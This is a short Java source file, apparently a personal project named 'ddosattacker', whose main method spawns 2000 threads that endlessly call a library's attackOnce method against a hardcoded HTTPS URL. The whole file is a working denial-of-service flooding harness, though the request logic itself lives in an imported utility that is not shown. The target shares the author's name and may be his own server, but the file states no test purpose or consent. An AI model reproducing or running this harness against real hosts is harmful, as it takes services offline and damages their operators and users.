package com.tugalsan.trm.ddosattacker;

import com.tugalsan.api.network.server.*;
import java.util.stream.*;

public class Main {

    public static void main(String... args) {
        var urlString = "https://tugalsan.com:8443";
        IntStream.range(0, 2000).parallel().forEach(i -> new Thread(() -> {
            while (true) {
                TS_NetworkDDosUtils.attackOnce(urlString);
            }
        }).start());
    }

}
